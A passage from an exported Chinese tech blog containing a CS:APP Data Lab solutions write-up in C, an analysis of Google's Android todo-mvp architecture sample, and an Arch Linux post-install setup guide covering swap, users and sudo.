<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divpwr2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> isALessThanZero = !!(x &amp; a);</span><br><span class="line">    <span class="keyword">int</span> isXHasMoreBit = (!!((~(a &gt;&gt; (<span class="number">32</span> + ~n))) &amp; x));</span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; n) + (isXHasMoreBit &amp; isALessThanZero);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h4></li>
<li><p>要求：计算-x</p>
</li>
<li>操作符使用数量限制：5</li>
<li><p>思路：略。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> ~x + <span class="number">1</span>; &#125;</span><br></pre></td></tr></table></figure>
<h4 id="isPositive"><a href="#isPositive" class="headerlink" title="isPositive"></a>isPositive</h4></li>
<li><p>要求：如果x大于0返回1，否则返回0</p>
</li>
<li>操作符使用数量限制：8</li>
<li><p>思路：检测符号位与x是否为0即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isPositive</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> !((x &amp; (<span class="number">1</span> &lt;&lt; <span class="number">31</span>)) | !x); &#125;</span><br></pre></td></tr></table></figure>
<h4 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h4></li>
<li><p>要求：如果x小于等于y则返回1，否则返回0</p>
</li>
<li>操作符使用数量限制：24</li>
<li><p>思路：本题的基本思路是判断x-y得到的值是否小于等于0，但是要考虑溢出带来的影响，首先定义了两个变量xp,yp分别表示x,y是否大于等于0。return的表达式的含义为并并非x大于等于0且y小于0的情况下（&amp;的后半部分），如果x-y小于或等于0或x小于零且y大于等于0，则返回1。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> xp = !(x &amp; t);</span><br><span class="line">    <span class="keyword">int</span> yp = !(y &amp; t);</span><br><span class="line">    <span class="keyword">int</span> p = x + ~y + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (!!(((!xp) &amp; yp) | ((p &amp; t) | !p))) &amp; (!(xp &amp; (!yp)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ilog2"><a href="#ilog2" class="headerlink" title="ilog2"></a>ilog2</h4></li>
<li><p>要求：返回x求以2为底的对数的结果 向下取整</p>
</li>
<li>操作符使用数量限制：90</li>
<li>思路：本题参照了<a href="http://blog.duskdragon.com/2017/04/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FDataLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/" target="_blank" rel="noopener">陈志浩学长的答案</a>。<br>解题算法的核心思想是二分查找，首先我们要明白这道题实际上想让我们求的是什么，经过观察我们可以得出结论，一个数求以2为底的对数的结果就相当于它二进制中位置最高的1的序号（序号从零开始由低位到高位）。那么我们需要做的就是查找并记录这个位置最高的1的位置。<br>算法过程如下：<ol>
<li>如果x &gt;&gt; 16的结果大于0，那么可以说明最高位的位置至少是16，那么我们可以将结果的第4位置1（序号编号规则同上），因为2 ^ 4 = 16，反之置0说明结果小于16.</li>
<li>下面考虑两种情况，如果第1步中x &gt;&gt; 16 大于0，说明我们需要在16位之后的第8位（第24位，相当于再二分）再进行二分查找，如果x &gt;&gt; 16小于0，那我们需要在16位之前的第8位（第8位，相当于再二分）进行查找，那么我们可以得出，下次查找时的范围为x &gt;&gt; (8 + result) (result表示上一步得到的结果（0或16）)，这个+result的意义可以认为是重新确定开始进一步二分查找的位置。<br>如果x &gt;&gt; (8 + result) 的结果大于0，那么说明结果（result)的第3位必为1，相当于在结果上加上了查找到的新位置，反之第3位应该仍为0.</li>
<li>按照上面的思路继续查找到不能再二分（偏移为x &gt;&gt; (1 + reuslt)），此时result中得到最终的最高位的位置。<br>算法描述起来比较难，参照代码推理几次就可以明白其中的巧妙之处：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> b4 = !!(x &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">int</span> b3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> b2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> b1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> b0 = <span class="number">0</span>;</span><br><span class="line">    result = b4 &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    b3 = !!(x &gt;&gt; (<span class="number">8</span> + result));</span><br><span class="line">    result = result | (b3 &lt;&lt; <span class="number">3</span>);</span><br><span class="line">    b2 = !!(x &gt;&gt; (<span class="number">4</span> + result));</span><br><span class="line">    result = result | (b2 &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    b1 = !!(x &gt;&gt; (<span class="number">2</span> + result));</span><br><span class="line">    result = result | (b1 &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    b0 = !!(x &gt;&gt; (<span class="number">1</span> + result));</span><br><span class="line">    result = result | b0;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第二部分-浮点数"><a href="#第二部分-浮点数" class="headerlink" title="第二部分 浮点数"></a>第二部分 浮点数</h3></li>
</ol>
</li>
</ul>
<p>所编写的程序必须满足如下要求：</p>
<ol>
<li>只能使用函数参数与函数内声明的局部变量</li>
<li>最多只能使用有限个运算符（等于号、括号不计），可以认为使用的运算符个数越少得分越高</li>
<li>禁止定义或使用任何宏</li>
<li>禁止定义任何函数</li>
<li>禁止调用任何函数（除了可以使用printf输出中间变量，但提交时必须去掉）</li>
<li>禁止使用任何形式的类型转换</li>
<li>禁止使用int、unsigned以外的任何类型（包括结构体、数组、联合体）</li>
<li>禁止定义或使用任何浮点常量</li>
</ol>
<p>也就是说在浮点数题目中，我们可以使用任意大小的整型数值，可以使用流程控制语句，可以使用任何操作符。</p>
<h4 id="float-neg"><a href="#float-neg" class="headerlink" title="float_neg"></a>float_neg</h4><ul>
<li><p>要求：返回-f的位级表示</p>
<p>本题及以下所有的题目都采用unsigned int来存放位级表示</p>
<p>所有的浮点类型都为float</p>
<p>如果输入为NaN，返回NaN</p>
</li>
</ul>
<ul>
<li>操作符使用数量限制：10</li>
<li>思路：对于一般的浮点数，我们只需要对它的符号位取反就可以了。需要特殊处理的只是无穷与NaN这两种非规格化的情况</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> result = uf ^ <span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">if</span> ((uf &amp; <span class="number">0x7F800000</span>) == <span class="number">0x7F800000</span> &amp;&amp; (uf &amp; <span class="number">0x007FFFFF</span>)) &#123;</span><br><span class="line">        result = uf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="float-i2f"><a href="#float-i2f" class="headerlink" title="float_i2f"></a>float_i2f</h4><ul>
<li>要求：实现由int到float的类型转换</li>
</ul>
<ul>
<li><p>操作符使用数量限制：30</p>
</li>
<li><p>思路：</p>
<p>由于浮点数的表示中对于负数并没有使用补码的方式，正负号完全取决于符号位，所以对于负数输入，我们需要做的第一步工作就是把它取负为正数再进行后面的操作。在这个过程我们需要记录下正负，在之后的操作中需要使用。</p>
<p>由于浮点数与整数表示的不同，浮点数的有效数字的位置在第0-22位的23位中，并且第一个1在规格化表示中会被省略，我们只需要第一个1以后的位数，并且我们需要知道在浮点数表示中它的指数应该为多少，所以在这个过程中我们同时需要记录第一个1出现的位置并以此决定指数。</p>
<p>在代码中使用了一个i来记录左移的位数，也就是最高位的1之前的零的个数，那么32-i就是最后的指数。</p>
<p>在循环中我们将整数的有效数字提前到了最前，然后将最高位移出， 这时我们用temp保存这时的状态。供之后的舍入判断使用。</p>
<p>接下来，我们需要将有效位移到正确的位置上，也就是向右位移9位。</p>
<p>下面按照之前的记录把符号位置上正确的值。</p>
<p>现在已经处理好有效数字与符号部分，下面要做的就是处理指数部分。</p>
<p>之前说过32-i是指数的数值，注意我们需要将这个值加上偏移量127，再放入表示指数的位置中。</p>
<p>下面就要处理舍入的情况了，浮点数表示的舍入规则比较特殊，也是本题的难点。结合本题的情况进行介绍：</p>
<p>在右移之前我们保存了这时的状态，因为当右移九位后原来的低九位如果有数据就会被舍弃，我们就需要根据舍弃的这九位与未被舍弃的最后一位（也就是原数第9位，<strong>下称第9位</strong>）来判断舍入的情况。</p>
<p>如果舍弃的这九位的最高位为0，那么说明舍去的数值小于保留下来的最低位表示的值的二分之一，那么我们不需要舍入。</p>
<p>如果舍弃的这九位的最高位为1，并且后面的位有数值，那么说明舍去的数值大于第9位表示的值的二分之一，这个时候我们需要舍入，也就是把最终结果加一。</p>
<p>如果舍弃的这九位的最高位为1，并且后面的位都是0，这个时候正好就是第9位表示的值的二分之一。那么这个时候我们就要看第9位，如果第9位为0，那么不舍入。如果第9位为1，那么进行舍入，也就是把最终结果加一。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> nega = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> temp;</span><br><span class="line">    <span class="keyword">unsigned</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x &amp; <span class="number">0x80000000</span>) &#123;</span><br><span class="line">        nega = <span class="number">1</span>;</span><br><span class="line">        x = ~x + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((x &amp; <span class="number">0x80000000</span>) != <span class="number">0x80000000</span>) &#123;</span><br><span class="line">        ++i;</span><br><span class="line">        x &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result = x &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    temp = result;</span><br><span class="line">    result &gt;&gt;= <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">if</span> (nega) &#123;</span><br><span class="line">        result |= <span class="number">0x80000000</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result &amp;= <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    i = (<span class="number">32</span> - i) + <span class="number">127</span>;</span><br><span class="line">    result = (result &amp; <span class="number">0x807FFFFF</span>) | (i &lt;&lt; <span class="number">23</span>);</span><br><span class="line">    <span class="keyword">if</span> ((temp &amp; <span class="number">0x00000100</span>) == <span class="number">0x00000100</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (temp &amp; <span class="number">0x000000FF</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> result + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (result &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> result + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="float-twice"><a href="#float-twice" class="headerlink" title="float_twice"></a>float_twice</h4><ul>
<li>要求：返回2*f的位级表示</li>
</ul>
<ul>
<li><p>操作符使用数量限制：30</p>
</li>
<li><p>思路：</p>
<p>如果该浮点数是非规格化的，那么我们需要将它的有效数字部分左移一位就可以达到乘二的效果，这个过程需要注意两个地方，第一是如果左移后如果有效数字的最高位溢出了，那么正好移到了指数部分成为了一个规格化的表示形式，所以我们无需担心左移后有效数字溢出的问题。第二是左移后会导致符号位被移出，我们需要在位移之后手动置上原来的符号位。</p>
<p>如果该浮点数是规格化的，那么我们只需要将它的指数部分加一。</p>
<p>其他情况的应该直接返回原值。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> result = uf;</span><br><span class="line">    <span class="keyword">if</span> ((uf &amp; <span class="number">0x7f800000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        result = ((uf &amp; <span class="number">0x007fffff</span>) &lt;&lt; <span class="number">1</span>) | (uf &amp; <span class="number">0x80000000</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((uf &amp; <span class="number">0x7f800000</span>) != <span class="number">0x7f800000</span>) &#123;</span><br><span class="line">        result = uf + <span class="number">0x00800000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h3><p>作为CS:APP的第一个lab，绝大部分的题目在经过仔细思考与测试后是可以自主完成的，但是其中的bitCount与ilog2由于需要使用分治与二分查找的算法，自己想出来的难度还是比较大的，在卡了两天以后还是去查了答案。</p>
]]></content>
      <categories>
        <category>Computer System</category>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>Computer System</tag>
        <tag>CS:APP</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Google官方MVP架构分析</title>
    <url>/2017/05/25/android_google_mvp/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>关于MVP模式的基本介绍与优缺点可以参见下面这篇文章：</p>
<blockquote>
<p>  <a href="https://segmentfault.com/a/1190000003927200" target="_blank" rel="noopener">https://segmentfault.com/a/1190000003927200</a></p>
</blockquote>
<p>本文的重点是对Google官方写的一个MVP架构实现的Demo进行简单的分析来看看谷歌实现的Android MVP架构是怎么搭建的。</p>
<p>谷歌官方的架构Demo地址：</p>
<blockquote>
<p>  <a href="https://github.com/googlesamples/android-architecture" target="_blank" rel="noopener">https://github.com/googlesamples/android-architecture</a></p>
</blockquote>
<p>本文所讲解的为：</p>
<blockquote>
<p>  <a href="https://github.com/googlesamples/android-architecture/tree/todo-mvp" target="_blank" rel="noopener">https://github.com/googlesamples/android-architecture/tree/todo-mvp</a></p>
</blockquote>
<p>需要读者参照源码查看本文。</p>
<p>我将这个todo应用的框架提炼出来（同时也意味着丢失了很多的实现细节，但可以将架构看得更加清晰），制作了一张伪<code>UML</code>图（为了简化，没有遵循<code>UML</code>的规范），下面我们参照着表中的内容进行分析：</p>
<a id="more"></a>
<p><img src="/images/android_mvp_uml.jpg" alt=""></p>
<h2 id="BaseView与BasePresenter"><a href="#BaseView与BasePresenter" class="headerlink" title="BaseView与BasePresenter"></a>BaseView与BasePresenter</h2><p>可以看到它们是独立于包外的两个基础接口，之后的所有<code>View</code>与<code>Presenter</code>接口都将继承它们，所以应该将一些通用的方法写在这两个<code>Base</code>接口中。</p>
<h2 id="tasks包"><a href="#tasks包" class="headerlink" title="tasks包"></a>tasks包</h2><p>整个app中<code>tasks</code>、<code>taskdetail</code>、<code>statistics</code>三个包对应着的就是三个<code>Activity</code>，可以看到每一个包中包含了对应的<code>Activity</code>、<code>View</code> 、<code>Presenter</code>与<code>Contract</code>类和其他工具组件，通过这样的方式构成了应用的一个组成单元（每一个<code>Activity</code>与其对应的<code>View</code>和实现逻辑的<code>Presenter</code>）。</p>
<p>图中我只展现了<code>tasks</code>这一个包，其他的包内部的结构也是一样的。</p>
<h3 id="TasksContract接口"><a href="#TasksContract接口" class="headerlink" title="TasksContract接口"></a>TasksContract接口</h3><p><code>TasksContract</code>接口包含两个接口，分别是继承了<code>BaseView</code>与<code>BasePresenter</code>的<code>View</code>与<code>Presenter</code>。</p>
<p>我们可以将<code>Contract</code>接口视为管理<code>View</code>与<code>Presenter</code>需要实现的方法的汇总接口，这些方法在实例类中实际上都是通过接口来进行调用的，这样就可以避免依赖于某一个特定类的方法来进行处理，从而可以有多种实现<code>View</code>与<code>Presenter</code>的方式，便于进行单元测试（可以看到源代码中就有很多单元测试的内容，但是在这篇文章中我们将它们忽略）。</p>
<p>一切与更新UI有关的逻辑都应该放在<code>TasksContract.View</code>接口中。</p>
<p>一切与业务有关的逻辑都应该放在<code>TaskContract.Presenter</code>接口中。</p>
<h3 id="TasksFragment与TasksPresenter"><a href="#TasksFragment与TasksPresenter" class="headerlink" title="TasksFragment与TasksPresenter"></a>TasksFragment与TasksPresenter</h3><p><code>TasksFragment</code>与<code>TaskPresenter</code>分别是<code>TasksContract.View</code>与<code>TaskContract.Presenter</code>接口的实例。</p>
<p><code>TaskActivity</code>在初始化时会先创建<code>TasksFragment</code>实例，再将其作为构造参数传递给<code>TaskPresenter</code>，<code>TaskPresenter</code>在构造方法中又会调用<code>TasksFragment</code>的<code>setPresenter</code>方法将自身传递给<code>TasksFragment</code>。这样<code>Presenter</code>与<code>View</code>就分别存有了一份对方的引用。</p>
<p>构造完成后，当用户与UI进行交互，<code>View</code>一律调用<code>Presenter</code>的相关方法来进行交互事件的处理或请求数据更新。如果有新的内容需要呈现在UI上，则由<code>Presenter</code>调用<code>View</code>的相关方法来进行更新。<code>Presenter</code>则负责与上一级的数据存储池进行交互来更新数据或是获取新的数据。</p>
<p>可以看到<code>Presenter</code>充当了一个“中介”，<code>View</code>的所有请求都将交由<code>Presenter</code>进行处理，而<code>View</code>现在需要做的只有提供相应方法供<code>Presenter</code>进行调用，避免了将大量业务逻辑写在<code>View</code>中。同时也避免了<code>View</code>与数据的直接交互，而是由<code>Presenter</code>“单线操作”，降低了耦合度。</p>
<h2 id="Data包"><a href="#Data包" class="headerlink" title="Data包"></a>Data包</h2><h3 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h3><p>这里的<code>Task</code>是一个<a href="https://en.wikipedia.org/wiki/Plain_old_Java_object" target="_blank" rel="noopener"><code>POJO</code></a>类，用于表示储存的数据。</p>
<h3 id="source包"><a href="#source包" class="headerlink" title="source包"></a>source包</h3><h4 id="TaskDataSource接口"><a href="#TaskDataSource接口" class="headerlink" title="TaskDataSource接口"></a>TaskDataSource接口</h4><p><code>TaskDataSource</code>接口定义了所有可以的用于操作数据的对象的方法，换句话说，无论数据的来源是什么，我们都可以通过调用实现了这个接口的对象的方法来操纵数据。</p>
<h4 id="GetTaskCallback与LoadTasksCallback"><a href="#GetTaskCallback与LoadTasksCallback" class="headerlink" title="GetTaskCallback与LoadTasksCallback"></a>GetTaskCallback与LoadTasksCallback</h4><p>注意到用于获取数据的方法的参数都利用了<code>callback</code>进行回调来传递数据。这样做主要因为数据的获取有可能是异步的，使用回调机制可以避免线程因为等待数据而阻塞。</p>
<h4 id="local包与remote包"><a href="#local包与remote包" class="headerlink" title="local包与remote包"></a>local包与remote包</h4><p>这两个包分别存放着一个实现了<code>TaskDataSource</code>接口的类，他们就代表了从本地缓存获取数据与从远端获取数据。当然与获取数据有关的其他类也应该放在这个包下。</p>
<h4 id="TaskRepository"><a href="#TaskRepository" class="headerlink" title="TaskRepository"></a>TaskRepository</h4><p>有了从本地与远端获取数据的类，那么就应该有一个类对它们进行管理，我们希望的是有本地缓存时读取本地缓存，没有时就从远端的获取数据。在更为复杂的情况下，我们需要处理来自远端的请求并与本地的数据进行同步。</p>
<p><code>TaskRepository</code>就是用于管理所有的这些数据来源并统一成一个<code>TaskDataSource</code>暴露给<code>Presenter</code>来操作数据，而这些数据管理逻辑就被隐藏在了<code>TaskRepository</code>中。</p>
<p>值得注意的是，源码中在<code>TaskRepository</code>中还实现了一个内存缓存，可以避免从其他两个低速来源中获取数据。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>Architecture</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>MVP</tag>
        <tag>Architecture</tag>
      </tags>
  </entry>
  <entry>
    <title>ArchLinux安装后的必须配置与图形界面安装教程</title>
    <url>/2017/05/19/arch_setup/</url>
    <content><![CDATA[<h2 id="ArchLinux安装后的必须配置"><a href="#ArchLinux安装后的必须配置" class="headerlink" title="ArchLinux安装后的必须配置"></a>ArchLinux安装后的必须配置</h2><p>在<a href="http://www.viseator.com/2017/05/17/arch_install/">上一篇教程</a>中，我们成功地安装了<code>ArchLinux</code>，这时系统处于一个非常精简的状态，为了日常使用，我们必须进行一些配置、安装一些需要的组件，来扩展我们的系统功能，开源的组件相互协同工作也是<code>Linux</code>的迷人之处之一。</p>
<p>下面的教程部分参考了官方<a href="https://wiki.archlinux.org/index.php/General_recommendations" target="_blank" rel="noopener">General recommendations</a>。</p>
<p>上述链接中还有很多本文未提及的可以配置的东西，感兴趣的同学可以阅读其中的内容对系统进行更加完善的配置。</p>
<a id="more"></a>
<h3 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络"></a>连接网络</h3><p>现在我们是在新安装的系统上进行操作，所以我们要重新联网，我们在之前安装系统时已经提前装好了相关的包。所以现在只要跟之前一样：</p>
<ul>
<li><p>如果你是有线网并且路由器支持DHCP的话插上网线后先执行以下命令获取IP地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd</span><br></pre></td></tr></table></figure>
</li>
<li><p>无线网：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wifi-menu</span><br></pre></td></tr></table></figure>
<p>按界面提示进行操作就可以了。</p>
<p>如果<code>wifi-menu</code>无法联网，可以尝试下面的方法<a href="https://www.cnblogs.com/houhaibushihai/p/10355683.html" target="_blank" rel="noopener">(来源)</a>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start wpa_supplicant.service</span><br></pre></td></tr></table></figure>
<p>使用<code>nmcli</code>查看Wifi列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli dev wifi list</span><br></pre></td></tr></table></figure>
<p>连接Wifi（注意要带引号）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli device wifi connect <span class="string">"你的Wifi名称"</span> password <span class="string">"你的Wifi密码"</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>同样可以使用<code>ping</code>命令来测试是否正常联网。</p>
<h3 id="创建交换文件"><a href="#创建交换文件" class="headerlink" title="创建交换文件"></a>创建交换文件</h3><p>交换文件可以在物理内存不足的时候将部分内存暂存到交换文件中，避免系统由于内存不足而完全停止工作。</p>
<p>之前我们通常采用单独一个分区的方式作为交换分区，现在更推荐采用交换文件的方式，更便于我们的管理。</p>
<p>分配一块空间用于交换文件，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fallocate -l 512M /swapfile （请将512M换成需要的大小，只能以M或G为单位）</span><br></pre></td></tr></table></figure>
<p>交换文件的大小可以自己决定，推荐4G以下的物理内存，交换文件与物理内存一致，4G以上的物理内存，交换文件4-8G。</p>
<p>更改权限，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 600 /swapfile</span><br></pre></td></tr></table></figure>
<p>设置交换文件，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkswap /swapfile</span><br></pre></td></tr></table></figure>
<p>启用交换文件，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">swapon /swapfile</span><br></pre></td></tr></table></figure>
<p>最后我们需要编辑<code>/etc/fstab</code>为交换文件设置一个入口，使用<code>vim</code>打开文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/fstab</span><br></pre></td></tr></table></figure>
<p><strong>注意编辑<code>fstab</code>文件的时候要格外注意不要修改之前的内容，直接在最后新起一行加入以下内容</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/swapfile none swap defaults 0 0</span><br></pre></td></tr></table></figure>
<h3 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h3><p>在这之前所有操作都是以<code>root</code>用户的身份进行的，由于<code>root</code>的权限过高，日常使用<code>root</code>用户是不安全的。<code>Linux</code>为我们提供了强大的用户与组的权限管理，提高了整个系统的安全性。这里我们就来新建一个用户。</p>
<p>执行以下命令来创建一个名为<code>username</code>的用户（请自行替换<code>username</code>为你的用户名）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -m -G wheel username （请自行替换username为你的用户名）</span><br></pre></td></tr></table></figure>
<p>在这里稍微解释一下各参数的含义：</p>
<p><code>-m</code>：在创建时同时在<code>/home</code>目录下创建一个与用户名同名的文件夹，这个目录就是你的<strong>家目录</strong>啦！家目录有一个别名是<code>~</code>，你可以在任何地方使用<code>~</code>来代替家目录路径。这个神奇的目录将会用于存放你所有的个人资料、配置文件等所有跟系统本身无关的资料。这种设定带来了诸多优点：</p>
<ul>
<li>只要家目录不变，你重装系统后只需要重新安装一下软件包（它们一般不存放在家目录），然后所有的配置都会从家目录中读取，完全不用重新设置软件着。</li>
<li>你可以在家目录不变的情况下更换你的发行版而不用重新配置你的环境。</li>
<li>切换用户后所有的设置会从新的用户的家目录中读取，将不同用户的资料与软件设置等完全隔离。</li>
<li>有些著名的配置文件比如<code>vim</code>的配置文件<code>~/.vimrc</code>，只要根据自己的使用习惯配置一次， 在另一个<code>Linux</code>系统下（例如你的服务器）把这个文件复制到家目录下，就可以完全恢复你的配置。</li>
</ul>
<p><code>-G wheel</code>：<code>-G</code>代表把用户加入一个组，对用户与组的概念感兴趣的同学可以自行查找有关资料学习。后面跟着的<code>wheel</code>就是加入的组名，至于为什么要加入这个组，后面会提到。</p>
<p>当然记得为新用户设置一个密码，执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd username （请自行替换username为你的用户名）</span><br></pre></td></tr></table></figure>
<p>根据提示输入两次密码就可以了，注意，这是你的用户密码，推荐与之前设置的<code>root</code>用户的密码不同。</p>
<h3 id="配置sudo"><a href="#配置sudo" class="headerlink" title="配置sudo"></a>配置sudo</h3><p>我们已经创建好了一个新的用户，以后我们将会使用这个用户来登录，那么如果我们需要执行一些只有<code>root</code>用户才能执行的命令（例如修改系统文件、安装软件包）怎么办？当然我们可以通过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></figure>
<p>命令来切换到<code>root</code>用户执行命令后再通过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p>返回普通用户。</p>
<p>但是<code>sudo</code>为我们提供了一个更快捷的办法，使用<code>sudo</code>，我们只要在需要<code>root</code>权权限执行的命令之前加上<code>sudo</code>就可以了，例如安装软件包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S something</span><br></pre></td></tr></table></figure>
<p>下面我们就来安装并配置<code>sudo</code>。</p>
<p><code>sudo</code>本身也是一个软件包，所以我们需要通过<code>pacman</code>来安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S sudo</span><br></pre></td></tr></table></figure>
<p>接下来我们需要用专门的<code>visudo</code>命令来编辑<code>sudo</code>的配置文件（前面这句是为了创建<code>vim</code>到<code>vi</code>的软链接避免找不到<code>vi</code>编辑器）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -s /usr/bin/vim /usr/bin/vi</span><br><span class="line">visudo</span><br></pre></td></tr></table></figure>
<p>实际上就是<code>vim</code>的操作，使用它是为了对编辑后的文件进行检查防止格式的错误。</p>
<p><img src="/images/arch20.jpg" alt=""></p>
<p>找到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># %wheel ALL=(ALL)ALL</span></span><br></pre></td></tr></table></figure>
<p>这行，去掉之前的<code>#</code>注释符，保存并退出就可以了。</p>
<p>这里的<code>%wheel</code>就是代表<code>wheel</code>组，意味着<code>wheel</code>组中的所有用户都可以使用<code>sudo</code>命令。</p>
<p>当然为了安全使用<code>sudo</code>命令还是需要输入<strong>当前用户</strong>的密码的。</p>
